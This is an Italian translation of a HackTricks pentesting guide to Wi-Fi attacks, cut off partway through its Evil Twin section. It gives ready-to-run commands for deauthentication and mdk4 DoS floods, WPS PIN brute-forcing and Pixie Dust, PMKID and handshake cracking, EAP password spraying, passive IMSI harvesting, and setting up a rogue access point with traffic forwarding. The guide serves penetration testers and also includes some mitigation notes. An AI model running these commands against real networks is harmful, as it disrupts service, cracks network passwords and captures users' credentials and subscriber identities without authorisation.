# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Comandi di base Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Strumenti

### Hijacker & NexMon (Wi-Fi interno di Android)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Esegui airgeddon con docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Può eseguire attacchi Evil Twin, KARMA e Known Beacons e poi usare un template di phishing per ottenere la password reale della rete o carpire le credenziali dei social network.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Questo strumento automatizza gli attacchi **WPS/WEP/WPA-PSK**. Eseguirà automaticamente:

- Imposta l'interfaccia in monitor mode
- Scansiona le reti disponibili - e ti permette di selezionare la/le vittima(e)
- Se WEP - Avvia attacchi WEP
- Se WPA-PSK
- Se WPS: Pixie dust attack e il brute-force attack (attenzione: il brute-force può richiedere molto tempo). Nota che non prova PIN null o PIN generati/da database.
- Prova a catturare il PMKID dall'AP per craccarlo
- Prova a deauthenticate i client dell'AP per catturare un handshake
- Se PMKID o Handshake, prova a bruteforce usando le top5000 password.

## Attacks Summary

- **DoS**
- Deauthentication/disassociation -- Disconnetti tutti (o uno specifico ESSID/Client)
- Random fake APs -- Nascondi reti, possibile crash di scanner
- Overload AP -- Prova a killare l'AP (di solito non molto utile)
- WIDS -- Gioca con l'IDS
- TKIP, EAPOL -- Alcuni attacchi specifici per DoS di alcuni AP
- **Cracking**
- Crack **WEP** (diversi tool e metodi)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (con o senza DoS)
- **Open** Evil Twin \[+ DoS] -- Utile per catturare credenziali di captive portal e/o effettuare attacchi LAN
- **WPA-PSK** Evil Twin -- Utile per attacchi di rete se conosci la password
- **WPA-MGT** -- Utile per catturare credenziali aziendali
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Utile per catturare credenziali di captive portal e/o effettuare attacchi LAN
- **+ WPA** -- Utile per catturare WPA handshakes

## DOS

### Deauthentication Packets

**Descrizione da** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks, un metodo diffuso nel Wi-Fi hacking, consistono nel forgiare frame "management" per **disconnettere forzatamente dispositivi da una rete**. Questi pacchetti non criptati ingannano i client facendoli credere provengano dalla rete legittima, permettendo agli attaccanti di raccogliere WPA handshakes per scopi di cracking o di interrompere persistentemente le connessioni di rete. Questa tattica, allarmante nella sua semplicità, è ampiamente usata ed ha implicazioni significative per la sicurezza delle reti.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 indica deauthentication
- 1 è il numero di deauths da inviare (puoi inviarne più di uno se vuoi); 0 significa inviarli continuamente
- -a 00:14:6C:7E:40:80 è l'indirizzo MAC dell'access point
- -c 00:0F:B5:34:30:30 è l'indirizzo MAC del client da deauthenticate; se questo è omesso allora viene inviata una broadcast deauthentication (non sempre funziona)
- ath0 è il nome dell'interfaccia

### Disassociation Packets

**Disassociation packets**, simili a **deauthentication packets**, sono un tipo di management frame usato nelle reti **Wi-Fi**. Questi pacchetti servono a recidere la connessione tra un dispositivo (ad esempio un laptop o uno smartphone) e un access point (AP). La distinzione principale tra disassociation e deauthentication risiede negli scenari d'uso. Mentre un AP emette **deauthentication packets** per rimuovere esplicitamente dispositivi rogue dalla rete, i disassociation packets vengono tipicamente inviati quando l'AP è in fase di spegnimento, riavvio o spostamento, rendendo necessario lo scollegamento di tutti i nodi connessi.

**Questo attacco può essere eseguito con mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Altri attacchi DOS di mdk4**

**In** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Invia beacon frames per mostrare fake APs ai client. Questo può talvolta mandare in crash network scanners e persino drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Inviare authentication frames a tutti gli Access Points (APs) accessibili nel raggio può sovraccaricare questi APs, specialmente quando sono coinvolti numerosi clients. Questo intenso traffico può portare all'instabilità del sistema, causando il blocco o addirittura il reset di alcuni APs.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**MODALITÀ DI ATTACCO p: SSID Probing and Bruteforcing**

Probing Access Points (APs) verifica se un SSID è correttamente rivelato e conferma la copertura dell'AP. Questa tecnica, unita al **bruteforcing hidden SSIDs** con o senza wordlist, aiuta a identificare e accedere a reti nascoste.

**MODALITÀ DI ATTACCO m: Michael Countermeasures Exploitation**

L'invio di pacchetti casuali o duplicati a diverse code QoS può innescare Michael Countermeasures su **TKIP APs**, causando lo spegnimento dell'AP per un minuto. Questo metodo è una tattica di attacco efficiente **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

L'inondazione di un AP con **EAPOL Start frames** crea **sessioni false**, sovraccaricando l'AP e bloccando i client legittimi. In alternativa, l'iniezione di **false EAPOL Logoff messages** disconnette forzatamente i client; entrambi i metodi interrompono efficacemente il servizio di rete.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Attacchi per le reti mesh IEEE 802.11s**

Diversi attacchi alla gestione dei link e al routing nelle reti mesh.

**ATTACK MODE w: WIDS Confusion**

La connessione incrociata dei client a più nodi WDS o a fake rogue APs può manipolare i sistemi di Intrusion Detection e Prevention, creando confusione e un potenziale abuso del sistema.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Un packet fuzzer che offre diverse sorgenti di pacchetti e un insieme completo di modificatori per la manipolazione dei pacchetti.

### **Airggedon**

_**Airgeddon**_ offers most of the attacks proposed in the previous comments:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) semplifica il processo di connessione dei dispositivi a un router, accelerando e facilitando la configurazione per le reti criptate con **WPA** o **WPA2** Personal. Non è efficace per la sicurezza **WEP**, facilmente compromessa. WPS utilizza un PIN di 8 cifre, verificato in due metà, rendendolo suscettibile ad attacchi brute-force a causa del limitato numero di combinazioni (circa 11.000 possibilità).

### WPS Bruteforce

Ci sono 2 strumenti principali per eseguire questa azione: Reaver e Bully.

- **Reaver** è stato progettato per essere un attacco robusto e pratico contro WPS, ed è stato testato su una vasta gamma di access point e implementazioni WPS.
- **Bully** è una **nuova implementazione** dell'attacco WPS brute force, scritta in C. Ha diversi vantaggi rispetto al codice originale di reaver: meno dipendenze, migliori prestazioni di memoria e CPU, corretta gestione dell'endianness e un set di opzioni più robusto.

L'attacco sfrutta la vulnerabilità del WPS PIN, in particolare l'esposizione delle prime quattro cifre e il ruolo dell'ultima cifra come checksum, agevolando l'attacco brute-force. Tuttavia, le difese contro gli attacchi brute-force, come il blocco degli indirizzi MAC degli attaccanti aggressivi, richiedono la rotazione dell'indirizzo MAC per continuare l'attacco.

Una volta ottenuto il WPS PIN con strumenti come Bully o Reaver, l'attaccante può dedurre la **WPA/WPA2 PSK**, garantendo accesso persistente alla rete.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Questo approccio raffinato prende di mira i WPS PINs sfruttando vulnerabilità note:

1. **PIN già noti**: Utilizza un database di PINs noti collegati a produttori specifici noti per usare WPS PINs uniformi. Questo database correla i primi tre ottetti di MAC-addresses con i PINs probabili per questi produttori.
2. **Algoritmi di generazione PIN**: Sfrutta algoritmi come ComputePIN e EasyBox, che calcolano WPS PINs basandosi sul MAC-address dell'AP. L'algoritmo Arcadyan richiede inoltre un device ID, aggiungendo un ulteriore livello al processo di generazione del PIN.

### WPS Pixie Dust attack

**Dominique Bongard** ha scoperto una falla in alcuni Access Points (APs) relativa alla generazione di codici segreti, noti come **nonces** (**E-S1** e **E-S2**). Se questi nonces possono essere ricostruiti, craccare il WPS PIN dell'AP diventa semplice. L'AP rivela il PIN all'interno di un codice speciale (hash) per dimostrare che è legittimo e non un AP falso (rogue AP). Questi nonces sono essenzialmente le "chiavi" per aprire la "cassaforte" che contiene il WPS PIN. Maggiori dettagli si trovano [qui](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

In termini semplici, il problema è che alcuni APs non usavano chiavi abbastanza casuali per cifrare il PIN durante il processo di connessione. Questo rende il PIN vulnerabile all'essere indovinato dall'esterno della rete (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Se non vuoi mettere il dispositivo in monitor mode, o se `reaver` e `bully` riscontrano problemi, puoi provare [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Questo strumento può eseguire un Pixie Dust attack senza dover passare in monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Alcuni sistemi mal progettati permettono addirittura a un **Null PIN** (un PIN vuoto o inesistente) di concedere l'accesso, il che è piuttosto insolito. Lo strumento **Reaver** è in grado di testare questa vulnerabilità, a differenza di **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

All the proposed WPS attacks can be easily performed using _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 e 6 permettono di provare il tuo **PIN personalizzato** (se ne hai uno)
- 7 e 8 eseguono il **Pixie Dust attack**
- 13 permette di testare il **NULL PIN**
- 11 e 12 **recuperano i PIN relativi all'AP selezionato dai database disponibili** e **generano** possibili **PIN** usando: ComputePIN, EasyBox e opzionalmente Arcadyan (consigliato, perché no?)
- 9 e 10 testeranno **ogni possibile PIN**

## **WEP**

Ormai così vulnerabile e poco usato. Tieni presente che _**airgeddon**_ ha un'opzione WEP chiamata "All-in-One" per attaccare questo tipo di protezione. Anche altri strumenti offrono opzioni simili.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

In 2018, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) a new attack method, unique because it only needs **one single packet** and doesn't require any clients to be connected to the target AP—just interaction between the attacker and the AP.

Many modern routers add an **optional field** to the **first EAPOL** frame during association, known as `Robust Security Network`. This includes the `PMKID`.

As the original post explains, the **PMKID** is created using known data:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Dato che il "PMK Name" è costante, conosciamo la BSSID dell'AP e della station, e il `PMK` è identico a quello di una full 4-way handshake, **hashcat** può usare queste informazioni per crackare la PSK e recuperare la passphrase!

Per **gather** queste informazioni e **bruteforce** localmente la password puoi fare:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
I **PMKIDs catturati** verranno mostrati nella **console** e saranno anche **salvati** in \_ **/tmp/attack.pcap**\_\
Ora, converti la cattura nel formato **hashcat/john** e craccala:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Nota che il formato di un hash corretto contiene **4 parti**, come: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Se il tuo **contiene solo** **3 parti**, allora è **invalido** (la cattura PMKID non era valida).

Nota che `hcxdumptool` **cattura anche handshakes** (apparirà qualcosa del genere: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Puoi **trasformare** gli **handshakes** nel formato **hashcat**/**john** usando `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Ho notato che alcuni handshakes catturati con questo strumento non potevano essere cracked anche conoscendo la password corretta. Raccomando di catturare gli handshakes anche con il metodo tradizionale se possibile, oppure di catturarne diversi usando questo strumento._

### Cattura handshake

Un attacco alle reti **WPA/WPA2** può essere eseguito catturando un **handshake** e tentando di **crack** la password **offline**. Questo processo comporta il monitoraggio della comunicazione di una rete specifica e del **BSSID** su un particolare **channel**. Ecco una guida semplificata:

1. Identificare il **BSSID**, il **channel**, e un **connected client** della rete target.
2. Usa `airodump-ng` per monitorare il traffico di rete sul **channel** e il **BSSID** specificati, sperando di catturare un handshake. Il comando sarà simile a questo:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Per aumentare la probabilità di catturare un handshake, scollega momentaneamente il client dalla rete per forzare una re-authentication. Questo può essere fatto usando il comando `aireplay-ng`, che invia deauthentication packets al client:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Nota che, poiché il client è stato deauthenticated, potrebbe tentare di connettersi a un AP diverso o, in altri casi, a una rete diversa._

Quando in `airodump-ng` appaiono alcune informazioni di handshake, significa che l'handshake è stato catturato e puoi smettere di ascoltare:

![](<../../images/image (172) (1).png>)

Una volta che l'handshake è stato catturato puoi effettuare il **crack** con `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Verifica se un handshake è presente nel file

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Se questo strumento trova una handshake incompleta di un ESSID prima di quella completata, non rileverà quella valida._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

Negli **ambienti WiFi aziendali incontrerai diversi metodi di autenticazione**, ciascuno dei quali offre differenti livelli di sicurezza e funzionalità di gestione. Quando usi strumenti come `airodump-ng` per ispezionare il traffico di rete, potresti notare identificatori per questi tipi di autenticazione. Alcuni metodi comuni includono:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Questo metodo supporta hardware token e one-time passwords all'interno di EAP-PEAP. A differenza di MSCHAPv2, non usa un peer challenge e invia le password in plaintext all'access point, esponendo a rischi di downgrade attacks.
2. **EAP-MD5 (Message Digest 5)**:
- Coinvolge l'invio dell'hash MD5 della password dal client. Non è raccomandato a causa della vulnerabilità agli attacchi dizionario, della mancanza di autenticazione del server e dell'impossibilità di generare session-specific WEP keys.
3. **EAP-TLS (Transport Layer Security)**:
- Utilizza certificati sia lato client sia lato server per l'autenticazione e può generare dinamicamente WEP keys basate sull'utente e sulla sessione per proteggere le comunicazioni.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Fornisce autenticazione reciproca tramite un tunnel cifrato, insieme a un metodo per derivare WEP keys dinamiche, per-utente e per-sessione. Richiede solo certificati lato server, mentre i client usano credenziali.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Funziona in modo simile a EAP creando un TLS tunnel per comunicazioni protette. Permette l'uso di protocolli di autenticazione più deboli sopra EAP grazie alla protezione offerta dal tunnel.
- **PEAP-MSCHAPv2**: Spesso indicato semplicemente come PEAP, combina il vulnerabile meccanismo challenge/response di MSCHAPv2 con un tunnel TLS protettivo.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Simile a EAP-TLS ma avvia un TLS tunnel prima dello scambio dei certificati, offrendo un ulteriore livello di sicurezza.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Cattura del nome utente

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) sembra che se stai usando **EAP** i messaggi **"Identity"** devono essere **supported**, e lo **username** verrà inviato in **clear** nei messaggi **"Response Identity"**.

Anche usando uno dei metodi di autenticazione più sicuri: **PEAP-EAP-TLS**, è possibile **catturare lo username inviato nel protocollo EAP**. Per farlo, **cattura una comunicazione di autenticazione** (avvia `airodump-ng` su un canale e `wireshark` nella stessa interfaccia) e filtra i pacchetti con `eapol`.\
All'interno del pacchetto "**Response, Identity**", apparirà lo **username** del client.

![](<../../images/image (850).png>)

### Identità anonime

Identity hiding è supportato sia da EAP-PEAP che da EAP-TTLS. Nel contesto di una rete WiFi, una richiesta EAP-Identity è tipicamente avviata dall'access point (AP) durante il processo di association. Per proteggere l'anonimato dell'utente, la risposta del client EAP sul dispositivo dell'utente contiene solo le informazioni essenziali necessarie al RADIUS server iniziale per elaborare la richiesta. Questo concetto è illustrato attraverso i seguenti scenari:

- EAP-Identity = anonymous
- In questo scenario, tutti gli utenti utilizzano lo pseudonimo "anonymous" come identificatore utente. Il RADIUS server iniziale funziona come server EAP-PEAP o EAP-TTLS, responsabile della gestione del lato server del protocollo PEAP o TTLS. Il metodo di autenticazione interno (protetto) viene poi gestito localmente o delegato a un RADIUS server remoto (home).
- EAP-Identity = anonymous@realm_x
- In questa situazione, utenti provenienti da diversi realm nascondono la propria identità mentre indicano il rispettivo realm. Ciò permette al RADIUS server iniziale di proxyare le richieste EAP-PEAP o EAP-TTLS ai RADIUS server nei loro realm di origine, che agiscono come server PEAP o TTLS. Il RADIUS server iniziale opera soltanto come nodo relay RADIUS.
- In alternativa, il RADIUS server iniziale può funzionare come server EAP-PEAP o EAP-TTLS e gestire il metodo di autenticazione protetto o inoltrarlo a un altro server. Questa opzione facilita la configurazione di politiche distinte per vari realm.

In EAP-PEAP, una volta stabilito il TLS tunnel tra il PEAP server e il PEAP client, il PEAP server avvia una richiesta EAP-Identity e la trasmette attraverso il TLS tunnel. Il client risponde a questa seconda richiesta EAP-Identity inviando una EAP-Identity response contenente la vera identità dell'utente attraverso il tunnel cifrato. Questo approccio impedisce efficacemente che la vera identità dell'utente venga rivelata a chiunque stia intercettando il traffico 802.11.

EAP-TTLS segue una procedura leggermente diversa. Con EAP-TTLS, il client tipicamente si autentica usando PAP o CHAP, protetti dal TLS tunnel. In questo caso, il client include un attributo User-Name e oppure un attributo Password o CHAP-Password nel primo messaggio TLS inviato dopo l'instaurazione del tunnel.

Indipendentemente dal protocollo scelto, il server PEAP/TTLS ottiene la conoscenza della vera identità dell'utente dopo che il TLS tunnel è stato stabilito. La vera identità può essere rappresentata come user@realm o semplicemente user. Se il server PEAP/TTLS è anche responsabile dell'autenticazione dell'utente, ora possiede l'identità dell'utente e procede con il metodo di autenticazione protetto dal TLS tunnel. In alternativa, il server PEAP/TTLS può inoltrare una nuova richiesta RADIUS al RADIUS server home dell'utente. Questa nuova richiesta RADIUS omette lo strato di protocollo PEAP o TTLS. Nei casi in cui il metodo di autenticazione protetto è EAP, i messaggi EAP interni vengono trasmessi al RADIUS server home senza il wrapper EAP-PEAP o EAP-TTLS. L'attributo User-Name del messaggio RADIUS in uscita contiene la vera identità dell'utente, sostituendo lo User-Name anonymous dalla richiesta RADIUS in ingresso. Quando il metodo di autenticazione protetto è PAP o CHAP (supportato solo da TTLS), l'User-Name e gli altri attributi di autenticazione estratti dal payload TLS vengono sostituiti nel messaggio RADIUS in uscita, rimpiazzando lo User-Name anonymous e gli attributi TTLS EAP-Message presenti nella richiesta RADIUS in ingresso.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

L'autenticazione Wi‑Fi basata su SIM usando EAP‑SIM/EAP‑AKA su 802.1X può esporre il identificatore permanente dell'abbonato (IMSI) in cleartext durante la fase di unauthenticated identity se la deployment non implementa pseudonyms/protected identities o un TLS tunnel attorno all'EAP interno.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Click to expand</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Note:
- Funziona prima di qualsiasi tunnel TLS se l'implementazione utilizza EAP‑SIM/AKA senza identità protette/pseudonimi.
- Il valore esposto è un identificatore permanente legato alla SIM dell'abbonato; la raccolta consente il tracciamento a lungo termine e abusi telecom a valle.

Impatto
- Privacy: tracciamento persistente di utenti/dispositivi da catture Wi‑Fi passive in luoghi pubblici.
- Punto di partenza per abusi telecom: con l'IMSI, un attaccante con accesso SS7/Diameter può interrogare la posizione o tentare l'intercettazione di chiamate/SMS e il furto di MFA.

Mitigazioni / cosa cercare
- Verificare che i client usino anonymous outer identities (pseudonimi) per EAP‑SIM/AKA secondo le linee guida 3GPP (es., 3GPP TS 33.402).
- Preferire il tunneling della fase di identità (es., EAP‑TTLS/PEAP che trasporta EAP‑SIM/AKA interno) in modo che l'IMSI non venga mai inviato in chiaro.
- Le catture di pacchetti di association/auth non dovrebbero mai rivelare un IMSI in chiaro in EAP-Response/Identity.

Correlato: Sfruttamento della segnalazione telecom con identificatori mobili catturati
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

If the client is expected to use a **username and password** (notice that **EAP-TLS won't be valid** in this case), then you could try to get a **list** a **usernames** (see next part) and **passwords** and try to **bruteforce** the access using [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Puoi anche eseguire questo attacco usando `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Client attacks Theory

### Network Selection and Roaming

- Il protocollo 802.11 definisce come una station si unisce a un Extended Service Set (ESS) ma non specifica i criteri per la selezione di un ESS o di un access point (AP) al suo interno.
- Le station possono effettuare roaming tra AP che condividono lo stesso ESSID, mantenendo la connettività attraverso un edificio o un'area.
- Il protocollo richiede l'autenticazione della station verso l'ESS ma non obbliga l'AP ad autenticarsi verso la station.

### Preferred Network Lists (PNLs)

- Le station memorizzano l'ESSID di ogni rete wireless a cui si connettono nella loro Preferred Network List (PNL), insieme ai dettagli di configurazione specifici della rete.
- La PNL viene usata per connettersi automaticamente a reti note, migliorando l'esperienza dell'utente semplificando il processo di connessione.

### Passive Scanning

- Gli AP trasmettono periodicamente beacon frames, annunciando la loro presenza e caratteristiche, incluso l'ESSID dell'AP, a meno che la trasmissione non sia disabilitata.
- Durante la scansione passiva, le station ascoltano i beacon frames. Se l'ESSID di un beacon corrisponde a un elemento della PNL della station, questa può connettersi automaticamente a quell'AP.
- La conoscenza della PNL di un dispositivo permette possibili sfruttamenti imitando l'ESSID di una rete conosciuta, inducendo il dispositivo a connettersi a un rogue AP.

### Active Probing

- L'active probing coinvolge le station che inviano probe requests per scoprire gli AP nelle vicinanze e le loro caratteristiche.
- I directed probe requests mirano a un ESSID specifico, aiutando a rilevare se una determinata rete è nel raggio d'azione, anche se è una rete nascosta.
- I broadcast probe requests hanno il campo SSID nullo e vengono inviati a tutti gli AP nelle vicinanze, permettendo alla station di verificare la presenza di qualsiasi rete preferita senza rivelare il contenuto della sua PNL.

## Simple AP with redirection to Internet

Prima di spiegare come eseguire attacchi più complessi verrà spiegato **come** semplicemente **creare** un **AP** e **reindirizzare** il suo **traffico** verso un'interfaccia connessa a Internet.

Using `ifconfig -a` check that the wlan interface to create the AP and the interface connected to the Internet are present.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Crea il file di configurazione `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Poi **set IPs** e **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
E poi **avvia** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Crea un file di configurazione `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Ferma i processi fastidiosi**, imposta **monitor mode**, e avvia **hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Inoltro e Reindirizzamento
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Un attacco Evil Twin sfrutta il modo in cui i client WiFi riconoscono le reti, basandosi principalmente sul nome della rete (ESSID) senza richiedere che la base station (access point) si autentichi verso il client. I punti chiave includono:

- **Difficoltà nella distinzione**: I dispositivi fanno fatica a distinguere tra access point legittimi e rogue quando condividono lo stesso ESSID e tipo di cifratura. Nelle reti reali spesso si usano più access point con lo stesso ESSID per estendere la copertura senza interruzioni.
